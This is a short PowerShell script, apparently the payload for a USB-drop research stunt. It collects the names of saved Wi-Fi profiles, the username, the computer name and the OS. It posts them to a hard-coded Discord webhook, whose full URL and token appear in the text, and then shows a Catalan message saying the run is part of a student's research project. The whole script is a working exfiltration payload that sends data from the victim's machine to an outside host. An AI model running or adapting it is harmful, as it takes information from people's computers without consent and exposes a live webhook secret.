$nw="**Xarxes wifi:**\r\n";
netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value;
    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
  }
Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1170142170838216744/WSpOKi2cpXc61h0Ync6Ff8UfxwittRG2OScStJsW6f-_91kzb58WdIxHKpOHqJL8G9W9" -Method Post -Body ('{"username": "llMegaHacker - Foto2","avatar_url": "https://i.imgur.com/4M34hi2.png","content": "'+$nw+'\r\n**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}');
Add-Type -AssemblyName PresentationCore,PresentationFramework;
[System.Windows.Forms.MessageBox]::Show("Hola, aquest missatge és part del treball de recerca de Joan, torna l'usb a consejeria. Gràcies per participar-hi!!!","Trec J04n");
